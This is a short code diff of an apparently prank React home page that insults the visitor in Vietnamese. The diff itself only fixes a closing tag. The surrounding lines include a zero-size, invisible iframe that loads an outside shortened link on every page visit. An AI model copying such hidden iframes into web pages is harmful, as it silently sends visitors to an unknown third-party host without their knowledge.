@@ -35,7 +35,7 @@ export default function Home() {
         <img src={'https://4.bp.blogspot.com/-k1PJp9KaaWE/XLKZLRgtdtI/AAAAAAAAC_U/gLX9_hMoI8ktHnKXCaGmHdXTeU0gLyyXwCLcBGAs/s400/l%25E1%25BB%25ABa.jpg'} />
         <iframe src='https://maper.info/X6uyi' height={0} width={0} />
         <h1>Đồ con lừa !!!! Ahihi</h1>
-      </div >
+      </div>
     </>
   )
 }
